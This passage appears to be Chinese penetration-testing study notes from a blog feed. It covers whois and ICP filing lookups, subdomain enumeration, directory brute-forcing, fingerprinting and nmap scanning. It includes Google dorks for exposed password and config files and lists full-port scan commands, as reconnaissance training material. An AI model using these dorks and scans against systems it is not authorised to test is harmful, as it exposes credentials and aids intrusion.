system，DNS）来将域名和IP地址相互映射，使得访问互联网更方便。</p><p><strong>域名分类</strong></p><p>顶级域名：.com</p><p>二级域名：baidu.com</p><p>三级域名：<a href="http://www.baidu.com/">www.baidu.com</a></p><p>政府域名：.gov</p><p>商业域名：.com</p><p>教育域名：.edu</p><p><strong>Whois</strong></p><p>Whois是用来查询域名的IP和所有者信息的传输协议，就是一个用来查询域名是否已经被注册，以及注册域名的详细信息（域名归属者的联系方式、注册和到期时间等）的数据库。</p><p>Whois通常使用TCP协议43端口，每个域名&#x2F;IP的whois信息由对应的管理机构保存，Whois查询关注的重点是注册商、注册人、注册人联系电话、邮件、DNS解析服务器。</p><p>Whois查询的重要性：通过whois查询可以获得域名注册者邮箱地址等信息，一般情况下对于中小型网站，域名注册者就是网站管理员，利用搜索引擎对whois查询到的信息进行搜索，可以获取更多域名注册者的个人信息。</p><p>相关实验：&lt;Whois网络注册信息探测&gt;：<a href="https://www.hetianlab.com/expc.do?ec=66a18063-8287-4b7c-9dfd-97faf52282f1">https://www.hetianlab.com/expc.do?ec=66a18063-8287-4b7c-9dfd-97faf52282f1</a></p><p><strong>备案信息</strong></p><p>网站备案信息是根据国家法律法规规定，由网站所有者向国家有关部门申请的备案，是国家信息产业部对网站的一种管理途径，为了防止在网上从事非法网站经营活动。备案号是网站是否合法注册经营的标志，可随时在国家工业和信息化部网站备案系统上查询该ICP备案的详细信息。</p><p><strong>子域名</strong></p><p>子域名（subdomain）是在域名系统等级中，属于更高一层域的域。比如mail.heetian.com和bbs.heetian.com是heetian.com的子域，heetian.com是顶级域.com的子域。</p><p>相关实验：&lt;<a href="https://www.hetianlab.com/expc.do?ec=ECID2ee2-d187-4b59-8995-ac5b8158539f">AWVS 10.5 子域名扫描、盲注、结果比较</a>&gt;</p><p>为什么要查询网站的子域名？</p><p>1）了解竞争对手网站的业务动向；</p><p>2）渗透测试时进行旁注：通过检测哪些子域名存在安全风险，从而判断能否进一步影响到主机的安全。</p><h2 id="实验目的-2"><a href="#实验目的-2" class="headerlink" title="实验目的"></a>实验目的</h2><p>通过实验学习Whois网络注册信息探测的目的和技术方法，了解备案信息在信息收集过程中的重要性，掌握子域名挖掘的常用方式。</p><h2 id="实验环境-2"><a href="#实验环境-2" class="headerlink" title="实验环境"></a>实验环境</h2><p>无特殊要求，能访问互联网即可。</p><h2 id="实验步骤一-2"><a href="#实验步骤一-2" class="headerlink" title="实验步骤一"></a>实验步骤一</h2><p><strong>任务描述：Whois查询hetianlab.com的注册信息。</strong></p><p>使用第三方网站查询</p><p><a href="https://whois.aliyun.com/">https://whois.aliyun.com</a> （中国万网&#x2F;阿里云）</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230821110925519.png" alt="image-20230821110925519"></p><p><a href="http://whois.chinaz.com/">http://whois.chinaz.com</a> （站长工具）</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.action" alt="img"></p><p>kali自带whois的查询工具</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.action" alt="img"></p><h2 id="实验步骤二-2"><a href="#实验步骤二-2" class="headerlink" title="实验步骤二"></a>实验步骤二</h2><p><strong>任务描述：备案信息查询。</strong></p><p>备案信息查询主要关注的是单位信息，如名称、备案编号、网站负责人、法人、电子邮箱、联系电话等。</p><p>使用第三方网站查询</p><p><a href="http://www.beianbeian.com/">http://www.beianbeian.com</a>（ICP备案查询网）</p><p><a href="https://www.tianyancha.com/">https://www.tianyancha.com</a> （天眼查）</p><p>备案号反查，目的是了解目标主体公司下有哪些资产，便于我们确定范围。</p><p>如合天网安实验室的备案号反查结果：</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.action" alt="img"></p><h2 id="实验步骤三-1"><a href="#实验步骤三-1" class="headerlink" title="实验步骤三"></a>实验步骤三</h2><p><strong>任务描述：子域名收集，分为被动子域枚举和主动子域枚举。</strong></p><p><strong>被动子域枚举</strong>：收集子域信息的过程不会产生任何流量，<em><strong>目的是要隐身且留下很少或没有足迹。</strong></em></p><ol><li><p>证书透明度：证书透明度日志通过设计包含了由参与的CA针对任何给定域颁发的所有证书，SSL&#x2F;TLS证书通常包含域名、子域名和电子邮件地址。这些日志是公开的，这使得它们成为攻击者的信息宝库。通过查看证书透明度日志，攻击者可以收集有关组织基础结构的大量信息。</p><p><a href="https://crt.sh/">https://crt.sh</a></p></li><li><p>使用搜索引擎</p><p>Bing：发现子域名：site:target.com；过滤掉-site:<a href="http://www.hetianlab.com/">www.hetianlab.com</a></p></li><li><p>使用DNS聚合器</p><p><a href="https://dnsdumpster.com/">https://dnsdumpster.com</a></p><p>可以为给定域查找潜在的大量子域，有一个非官方的Python库来提取数据。</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.action" alt="img"></p></li></ol><p><strong>主动子域枚举：</strong>攻击者通过探测目标组织管理的基础结构来收集子域信息，主动枚举会产生检测可能导致的流量。</p><ol><li><p>Subbrute：根据DNS记录查询子域名，旨在创建最快、最准确的子域枚举工具。使用开放式解析器作为代理来规避DNS速率限制，该设计还提供了一层匿名性，不会将流量直接发送到目标的名称服务器。地址：<a href="https://github.com/TheRook/subbrute">https://github.com/TheRook/subbrute</a></p><p><em><strong>但是速度太慢了</strong></em></p></li></ol><h1 id="网站信息收集"><a href="#网站信息收集" class="headerlink" title="网站信息收集"></a>网站信息收集</h1><h2 id="预备知识-1"><a href="#预备知识-1" class="headerlink" title="预备知识"></a>预备知识</h2><p><strong>路径信息</strong></p><p>路径信息收集&#x2F;目录扫描可以让我们发现这个网站存在多少个目录，多少个页面，探索出网站的整体结构，通过目录扫描我们还可以获取敏感文件、后台文件、数据库文件等。</p><p><strong>指纹信息</strong></p><p>攻击者<em><strong>最常用</strong></em>的方法是覆盖目标网络存在并枚举尽可能多的信息，以便制定出准确的攻击方案，有效利用目标主机正在使用的软件类型&#x2F;版本中的漏洞。指纹识别的目的是知道当前资产的一些基本情况，可以根据不同的指纹进行对应的测试，提升测试效率。在发起攻击之前我们需要了解某一程序特征、弱点或是历史存在的缺陷，有利于对目标进行快速了解。</p><p>相关实验：&lt;<a href="https://www.hetianlab.com/expc.do?ec=ECID8c3b-a997-48f1-a59b-70259fe9b2ec">python爬虫-WEB目录爆破和指纹识别</a>&gt;</p><p><strong>CMS信息</strong></p><p>CMS是content management system的缩写，意为‘内容管理系统’，很多网站为了简单和快速地部署服务，会使用别人开发好的CMS进行网站搭建。网站CMS查询可以帮助我们快速地定义使用的CMS，只要爆出漏洞的话影响的就是很多个站点。</p><p>相关课程：《<a href="https://www.hetianlab.com/cour.do?w=1&c=CCIDead9-9369-4950-8c61-7430fed27d23">CMS安全实践</a>》</p><p><strong>WAF信息</strong></p><p>WAF全称Web Application Firewall，中文名是Web应用防护系统，也称网站应用级入侵防御系统，是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略，来专门为Web应用提供保护的一款产品。</p><p>相关实验：&lt;<a href="https://www.hetianlab.com/expc.do?ec=ECIDee9320adea6e062017110811103300001">WAF渗透攻防实践</a>&gt;</p><p><strong>SSL信息</strong></p><p>HTTPS服务器需要正确的配置来提供有效的加密方式，保护用户不受MITM攻击（man-in-the-MiddleAttack，中间人攻击）或者密码分析。一些SSL协议的实现和设计上的漏洞已经被发现了，我们需要对HTTPS进行检查。</p><h2 id="实验目的-3"><a href="#实验目的-3" class="headerlink" title="实验目的"></a>实验目的</h2><p>通过实验了解网站的路径信息、指纹信息、敏感文件的收集方式，查询网站的CMS类型及版本，学会WAF识别和对HTTPS进行检查。</p><h2 id="实验步骤一-3"><a href="#实验步骤一-3" class="headerlink" title="实验步骤一"></a>实验步骤一</h2><p><strong>任务描述：路径信息收集。</strong></p><ol><li><p>7kbscan-WebPathBrute</p><p>Web路径暴力探测工具,地址：<a href="https://github.com/7kbstorm/7kbscan-WebPathBrute">https://github.com/7kbstorm/7kbscan-WebPathBrute</a></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230821131347513.png" alt="image-20230821131347513"></p></li><li><p>dirsearch</p><p>一个简单的命令行工具，旨在暴力破解网站中的目录和文件，地址：<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p><p><img src="D:\hexo\source_posts\渗透\实验.assets\image-20230821134706590.png" alt="image-20230821134706590"></p></li></ol><h2 id="实验步骤二-3"><a href="#实验步骤二-3" class="headerlink" title="实验步骤二"></a>实验步骤二</h2><p><strong>任务描述：敏感文件探测。</strong></p><ol><li><p>利用搜索引擎</p><p>site:xxx.com filetype:xls</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230821134951298.png" alt="image-20230821134951298"></p></li><li><p>WEB-INF&#x2F;web.xml</p><p>WEB-INF是Java的Web应用安全目录，如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行映射。</p></li><li><p>FileScan</p></li></ol><p>   敏感文件扫描，地址：<a href="https://github.com/Mosuan/FileScan">https://github.com/Mosuan/FileScan</a></p><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.png" alt="headImg"></p><h2 id="实验步骤三-2"><a href="#实验步骤三-2" class="headerlink" title="实验步骤三"></a>实验步骤三</h2><p><strong>任务描述：指纹信息收集。</strong></p><ol><li><p>第三方网站</p><p><a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a> （云悉指纹）</p><p><a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a> （潮汐指纹）</p><p>推荐使用：潮汐指纹</p></li><li><p>服务器ssh配置ssh_scan</p><p>SSH配置和策略扫描程序，地址：<a href="https://github.com/mozilla/ssh_scan">https://github.com/mozilla/ssh_scan</a></p></li><li><p>w12scan</p><p>一款网络资产发现引擎，通过Web接口下发任务，会自动将相关的资产聚合在一起方便分析使用。地址：<a href="https://github.com/w-digital-scanner/w12scan">https://github.com/w-digital-scanner/w12scan</a></p><p>使用参考：<a href="https://www.bugku.com/thread-3810-1-1.html">https://www.bugku.com/thread-3810-1-1.html</a></p></li></ol><h2 id="实验步骤四"><a href="#实验步骤四" class="headerlink" title="实验步骤四"></a>实验步骤四</h2><p><strong>任务描述：CMS信息查询。</strong></p><ol><li><p>第三方网站</p><p><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a> （在线CMS指纹识别）</p><p>但是报错502也就是说对方的服务器出现了问题</p></li><li><p>CMS-Exploit-Framework</p><p>一款CMS漏洞利用框架，通过它可以很容易地获取、开发CMS漏洞利用插件，并对目标应用进行测试。地址：<a href="https://github.com/Q2h1Cg/CMS-Exploit-Framework">https://github.com/Q2h1Cg/CMS-Exploit-Framework</a></p><p>CMS识别：</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.action" alt="img"></p></li></ol><h2 id="实验步骤五"><a href="#实验步骤五" class="headerlink" title="实验步骤五"></a>实验步骤五</h2><p><strong>任务描述：WAF识别。</strong></p><ol><li><p>wafw00f</p><p>一个Web应用防火墙（WAF）指纹识别工具，地址：<a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p><p>工作原理：首先发送正常的HTTP请求并分析响应，如果不成功，将发送多个HTTP请求（可能是恶意的），并使用简单的逻辑来推断出它是哪个WAF。如果还是不成功，将分析先前返回的响应，并使用另一种简单的算法来猜测WAF或安全解决方案是否正在积极响应我们的攻击。</p></li></ol><h2 id="实验步骤六"><a href="#实验步骤六" class="headerlink" title="实验步骤六"></a>实验步骤六</h2><p><strong>任务描述：其他信息收集。</strong></p><ol><li><p>sslscan</p><p>sslscan是kali自带的工具，能够基于服务器的安全通信来分析服务器的配置文件。</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.action" alt="img"></p><p>这一部分告诉了我们服务器的一些配置信息，包括常见的配置错误：不支持TLS Fallback SCSV（信令套件，可以用来阻止客户端和服务器之间的意外降级，预防中间人攻击）、支持安全会话重新协商、禁止压缩、没有心脏滴血漏洞</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.action" alt="img"></p><p>这一部分告诉我们服务器支持的加密算法，以及服务器首选的加密算法，红色代表不安全的算法，黄色代表中等强度的算法。</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.action" alt="img"></p><p>这一部分告诉我们证书签名的一些信息，这里用的是2048位的RSA进行签名。</p></li><li><p>Kali中还有另一个工具sslyze也可以从SSL&#x2F;TLS获取加密信息的攻击，并且有时会提供额外信息给攻击者；SSL&#x2F;TLS信息也可以通过openssl命令获得。</p></li></ol><h1 id="GET显错注入"><a href="#GET显错注入" class="headerlink" title="GET显错注入"></a>GET显错注入</h1><h2 id="预备知识-2"><a href="#预备知识-2" class="headerlink" title="预备知识"></a>预备知识</h2><p>SQL 注入是一种攻击方式，在这种攻击方式中，恶意代码被插入到字符串中，然后将该字符串传递到 SQL Server 的实例以进行分析和执行。任何构成 SQL 语句的过程都应进行注入漏洞检查，因为 SQL Server 将执行其接收到的所有语法有效的查询。一个有经验的、坚定的攻击者甚至可以操作参数化数据。</p><p>SQL 注入的主要形式包括直接将代码插入到与 SQL 命令串联在一起并使其得以执行的用户输入变量。一种间接的攻击会将恶意代码注入要在表中存储或作为元数据存储的字符串。在存储的字符串随后串连到一个动态 SQL 命令中时，将执行该恶意代码。</p><p>注入过程的工作方式是提前终止文本字符串，然后追加一个新的命令。由于插入的命令可能在执行前追加其他字符串，<strong>因此攻击者将用注释标记“–”来终止注入的字符串</strong>。执行时，此后的文本将被忽略。</p><h2 id="实验目的-4"><a href="#实验目的-4" class="headerlink" title="实验目的"></a>实验目的</h2><p>通过本实验掌握最基本的GET显错注入及GET方式盲注，理解盲注的判断点；了解POST传送工具的使用并根据显错信息来设定注入语句；了解HTTP的信息头并学会通过修改信息头来实现注入；使用base64进行编码解码；学会浏览查看修改cookie。</p><h2 id="实验环境-3"><a href="#实验环境-3" class="headerlink" title="实验环境"></a>实验环境</h2><p>服务器：windows2003，IP地址：10.1.1.10</p><p>客户端：winXP，IP地址随机分配</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息收集</title>
    <link href="/2023/08/20/%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2023/08/20/%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="whois"><a href="#whois" class="headerlink" title="whois  *"></a>whois  *</h2><p>一颗星，现在使用whois 可能查到的是中间商，比如阿里云。所以查不到重要的信息，不会六留下信息</p><h2 id="备案信息"><a href="#备案信息" class="headerlink" title="备案信息 *****"></a>备案信息 *****</h2><p><strong>缺点：</strong></p><ol><li>只用大陆的营运网站可以这么做</li><li>外国和港澳台不需要进行备案</li></ol><p><strong>用法：</strong></p><p>通过域名-&gt;公司名称-&gt;相关的子域名，更多的域名</p><h2 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询 *****"></a>子域名查询 *****</h2><p>非常重要，主要使用google搜索语法，</p><p><strong>方法：</strong></p><ol><li>google 搜索语法   *****</li><li>公开子域名</li><li>网络空间搜索引擎</li><li>备案信息</li><li>ssl证书查询</li><li>子域名爆破工具</li></ol><h2 id="IP-反差域名"><a href="#IP-反差域名" class="headerlink" title="IP 反差域名  **"></a>IP 反差域名  **</h2><blockquote><p><a href="http://stool.chinaz.com/same">http://stool.chinaz.com/same</a>  </p></blockquote><h2 id="域名查IP"><a href="#域名查IP" class="headerlink" title="域名查IP ****"></a>域名查IP ****</h2><p>主要是为了端口扫描</p><blockquote><p>  <a href="http://ip.tool.chinaz.com/">http://ip.tool.chinaz.com/</a>  </p></blockquote><blockquote><p>使用ping 或者nslookup</p><p>nslookup <a href="http://www.hetianlab.com/">www.hetianlab.com</a></p></blockquote><h2 id="CND-绕过"><a href="#CND-绕过" class="headerlink" title="CND 绕过 *****"></a>CND 绕过 *****</h2><p>这个主要是面试可能会考，现在绕过的几率基本为0，所以可以考虑放弃，使用其他的渗透点进行渗透</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描 *****"></a>端口扫描 *****</h2><p>如果没有CDN的话就直接扫描一下端口</p><h2 id="网站使用的操作系统"><a href="#网站使用的操作系统" class="headerlink" title="网站使用的操作系统 ***"></a>网站使用的操作系统 ***</h2><h2 id="网站的服务器的类型，脚本类型，cms，dbms"><a href="#网站的服务器的类型，脚本类型，cms，dbms" class="headerlink" title="网站的服务器的类型，脚本类型，cms，dbms***"></a>网站的服务器的类型，脚本类型，cms，dbms***</h2><p>dbms是指的是数据库引擎</p><h2 id="敏感文件"><a href="#敏感文件" class="headerlink" title="敏感文件*****"></a>敏感文件*****</h2><p>主要是使用dirsearch 进行目录爆破</p><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF ***"></a>WAF ***</h2><p>这个就很尴尬，如果检测到了，但是也绕过不去</p><h1 id="收集哪些信息"><a href="#收集哪些信息" class="headerlink" title="收集哪些信息"></a>收集哪些信息</h1><p>下面是我的使用的比较多的方法</p><h2 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h2><h3 id="备案信息-1"><a href="#备案信息-1" class="headerlink" title="备案信息"></a>备案信息</h3><p>主要是使用网站查询</p><p><a href="https://beian.miit.gov.cn/#/Integrated/index">ICP&#x2F;IP地址&#x2F;域名信息备案管理系统 (miit.gov.cn)</a>   </p><h3 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h3><ol><li><p>google搜索语法</p></li><li><p>fofa</p></li><li><p>hunter</p></li><li><p>js发现子域名</p><p>这个是使用</p><p>JSFinder脚本工具</p></li><li><p>oneforall</p><p>实在不行就用这个</p></li></ol><h2 id="网站信息"><a href="#网站信息" class="headerlink" title="网站信息"></a>网站信息</h2><h2 id="管理员信息"><a href="#管理员信息" class="headerlink" title="管理员信息"></a>管理员信息</h2><h2 id="服务器信息"><a href="#服务器信息" class="headerlink" title="服务器信息"></a>服务器信息</h2><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="前期信息收集"><a href="#前期信息收集" class="headerlink" title="前期信息收集"></a>前期信息收集</h2><h3 id="域名收集"><a href="#域名收集" class="headerlink" title="域名收集"></a>域名收集</h3><ol><li><p>域名简绍</p><p><strong>域名</strong>（Domain Name），简称域名、网域，是由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。<br><strong>DNS</strong>（域名系统，Domain Name System）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。</p></li><li><p>域名的分类</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/image-20230820204819127.png" alt="image-20230820204819127"></p></li><li><p>whois(不是很重要)</p><p>是用来查询&#x3D;&#x3D;域名的IP&#x3D;&#x3D;以及&#x3D;&#x3D;所有者&#x3D;&#x3D;等的信息的传输协议</p><p>Whois 简单来说，就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域<br>名注册商、域名注册日期和过期日期等）。通过域名 Whois 服务器查询，可以查询域名归属者联系方式，以及注册<br>和到期时间</p><p>对于中小型的服务器的管理者看可能使用自己的信息作为服务器的登录密码</p><p>下面就是使用<a href="https://whois.chinaz.com/">域名Whois查询 - 站长之家 (chinaz.com)</a>查询的结果</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230820205648295.png" alt="image-20230820205648295"></p></li><li><p>whois反查</p><ul><li><p>方式</p><blockquote><p>（1）根据已知域名反查，分析出此&#x3D;&#x3D;域名的注册人、邮箱、电话&#x3D;&#x3D;等字段；  </p><p>（2）根据已知域名WHOIS中的&#x3D;&#x3D;注册邮箱&#x3D;&#x3D;来反查得出其它域名WHOIS中注册&#x3D;&#x3D;邮箱与此相同的域名列表&#x3D;&#x3D;；  </p><p>（3）根据已知域名WHOIS中的&#x3D;&#x3D;注册人&#x3D;&#x3D;来反查得出其它域名WHOIS中&#x3D;&#x3D;注册人与此相同的域名列表&#x3D;&#x3D;；  </p></blockquote></li><li><p>缺点</p><p>很多公司都是DNS解析的运行商注册的，查到的是运行商代替个人和公司注册的网站信息</p></li><li><p>可以通过下面的网站进行反查</p><p> 域名反查：<a href="https://whois.chinaz.com/reverse?ddlSearchMode=0">https://whois.chinaz.com/reverse?ddlSearchMode=0</a>  </p><p>邮箱反查：<a href="https://whois.chinaz.com/reverse?ddlSearchMode=1">https://whois.chinaz.com/reverse?ddlSearchMode=1</a>  </p><p>注册人反查：<a href="https://whois.chinaz.com/reverse?ddlSearchMode=2">https://whois.chinaz.com/reverse?ddlSearchMode=2</a>  </p><p>电话反查：<a href="https://whois.chinaz.com/reverse?ddlSearchMode=3">https://whois.chinaz.com/reverse?ddlSearchMode=3</a>  </p></li><li><p>现在作用很少，有很多中间商，假设我们去查询可能查询到的是中间商的</p></li></ul></li><li><p>备案信息</p><p>备案号是网站是否合法注册经营的标志，可以用网页的备案号反查出该公司旗下的资产。 </p><p><a href="https://beian.miit.gov.cn/#/Integrated/index">ICP&#x2F;IP地址&#x2F;域名信息备案管理系统 (miit.gov.cn)</a>   </p></li><li><p>子域名</p><ul><li><p>谷歌高级搜索语法</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230820214327217.png" alt="image-20230820214327217"></p><p>常见的语法总结</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230820220114134.png" alt="image-20230820220114134"></p><blockquote><p>  <strong>index</strong> <strong>of</strong> &#x2F;<strong>admin</strong>  </p><p>  <strong>index</strong> <strong>of</strong> &#x2F;passwd  </p><p>  <strong>index</strong> <strong>of</strong> &#x2F;<strong>password</strong>  <strong>index</strong> <strong>of</strong> &#x2F;mail  </p><p>  “index  of &#x2F;“ +passwd  “index  of &#x2F;“ +<strong>password</strong>.txt  “index  of &#x2F;“ +.htaccess  “index  of &#x2F;root”  </p><p>  “index  of &#x2F;cgi-bin”  “index  of &#x2F;logs”  </p><p>  “index of &#x2F;config”</p></blockquote></li><li><p>使用公开渠道收集</p><blockquote><p>  <a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a>  </p><p>  <a href="https://www.dnsgrep.cn/">https://www.dnsgrep.cn/</a>  </p><p>  <a href="https://developers.virustotal.com/reference/domains-relationships">https://developers.virustotal.com/reference/domains-relationships</a> </p><p>  <a href="http://tool.chinaz.com/subdomain">http://tool.chinaz.com/subdomain</a>  </p><p>  <a href="https://www.nmmapper.com/sys/tools/subdomainfinder/">https://www.nmmapper.com/sys/tools/subdomainﬁnder/</a></p></blockquote></li></ul></li><li><p>ssl证书查询</p><p>  http-&gt;ssl-&gt;tls-&gt;https</p><p>  <a href="https://crt.sh/">https://crt.sh/</a>  </p></li><li><p>子域名得的收集工具</p><ol start="11"><li>SubFinder + KSubdomain + HttpX</li></ol><p><strong>SubFinder</strong>：用来查询域名的子域名信息的工具，可以使用很多国外安全网站的api接口进行自动化搜索子域名信  息。<a href="https://github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subﬁnder</a>  </p><p><strong>HttpX</strong>：一款运行速度极快的多功能HTTP安全工具，它可以使用retryablehttp库来运行多种网络探针，并使用了多  线程机制来维持运行的稳定性和结果的准确性。  <a href="https://github.com/projectdiscovery/httpx">https://github.com/projectdiscovery/httpx</a>  </p><p><strong>ksubdomain</strong>是一款基于无状态子域名爆破工具，支持在Windows&#x2F;Linux&#x2F;Mac上使用，它会很快的进行DNS爆破，  在Mac和Windows上理论最大发包速度在30w&#x2F;s,linux上为160w&#x2F;s的速度。  <a href="https://github.com/knownsec/ksubdomain">https://github.com/knownsec/ksubdomain</a>  </p><blockquote><p>  <em>#subfinder</em>基本使用  </p><p>  .&#x2F;subfinder  -d baidu.com -o output.txt  </p><p>  <em>#ksubdomain</em>基本使用  </p><p>  .&#x2F;ksubdomain  -d baidu.com  </p><p> *#*管道操作  </p><p>  .&#x2F;subfinder  -d baidu.com -silent|.&#x2F;ksubdomain -verify -silent|.&#x2F;httpx -title  -content-length -status-  code  </p><p> <em>#<em>可以用管道结合在一起配合工作。达到收集域名，验证域名，</em>http</em>验证存活目的。  </p></blockquote><p>&#x3D;&#x3D;通过管道符的完成三个工具的整合&#x3D;&#x3D;</p></li><li><p>js文件发现子域名</p></li></ol><h3 id="IP，端口信息的收集"><a href="#IP，端口信息的收集" class="headerlink" title="IP，端口信息的收集"></a>IP，端口信息的收集</h3><p>  <strong>CDN</strong>即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载  均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率  </p><ol><li><p>IP反差域名</p><blockquote><p>  <a href="http://stool.chinaz.com/same">http://stool.chinaz.com/same</a>  </p></blockquote></li><li><p>域名查询IP</p><blockquote><p>  <a href="http://ip.tool.chinaz.com/">http://ip.tool.chinaz.com/</a>  </p></blockquote><blockquote><p>使用ping 或者nslookup</p><p>nslookup <a href="http://www.hetianlab.com/">www.hetianlab.com</a></p></blockquote></li><li><p>多地ping</p><blockquote><p>  <a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a>  </p></blockquote></li><li><p>国外ping</p><blockquote><p>  <a href="https://ping.eu/ping/">https://ping.eu/ping/</a>  </p></blockquote><p>可以进行绕过的CDN的限制</p></li><li><p>渗透端口  </p><blockquote><p><a href="https://www.cnblogs.com/bmjoker/p/8833316.html">https://www.cnblogs.com/bmjoker/p/8833316.html</a></p></blockquote></li><li><p>端口扫描</p><p>使用nmap工具进行扫描</p><p>基础的使用方法是</p><p>linux</p><blockquote><p>nmap -A -T4 IP地址</p></blockquote><p>windows</p><blockquote><p>nmap.exe -A -T4 IP地址</p></blockquote><p>&#x3D;&#x3D;注意必须在执行文件的目录下使用，或者将其添加到path&#x3D;&#x3D;</p><p>参数的意义</p><blockquote><p>  <strong>A</strong>：全面扫描\综合扫描  T4：扫描速度，共有6级，T0-T5  </p></blockquote><p>其他说明</p><blockquote><p>  不加端口说明扫描默认端口，1-1024 + nmap-service  （nmap觉得的危险端口）</p><p>  单一主机扫描：nmap 192.168.1.2  </p><p>  子网扫描：nmap 192.168.1.1&#x2F;24  </p><p>  多主机扫描：nmap 192.168.1.1 192.168.1.10  </p><p>  主机范围扫描：nmap 192.168.1.1-100  </p><p>  IP地址列表扫描：nmap –iL target.txt  </p><p>  扫描除指定IP外的所有子网主机：  </p><p>  nmap 192.168.1.1&#x2F;24 –exclude  192.168.1.1  </p><p>  扫描除文件中IP外的子网主机：  </p><p>  nmap 192.168.1.1&#x2F;24 –excludefile  xxx.txt  </p><p>  扫描特定主机上的80,21,23端口：  </p><p>nmap –p 80,21,23 192.168.1.1</p></blockquote><p>扫描全部端口</p><blockquote><p>  nmap -sS -v -T4  -Pn -p 0-65535 -oN FullTCP -iL liveHosts.txt  